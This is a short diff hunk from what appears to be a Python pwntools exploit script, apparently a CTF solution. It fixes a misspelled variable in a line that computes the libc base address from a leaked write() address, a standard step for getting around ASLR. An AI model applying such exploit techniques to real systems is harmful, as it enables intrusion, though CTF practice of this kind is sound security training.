@@ -54,6 +54,6 @@ buf = io.recvline()
 #print buf
 libc_write = hex(u32(buf.strip().ljust(4,'\x00')))
 print 'write address: '+libc_write
-offset = int(libc_wrirte,16) - libc.sym['write']
+offset = int(libc_write,16) - libc.sym['write']
 print 'libc base address: '+str(hex(offset))
 
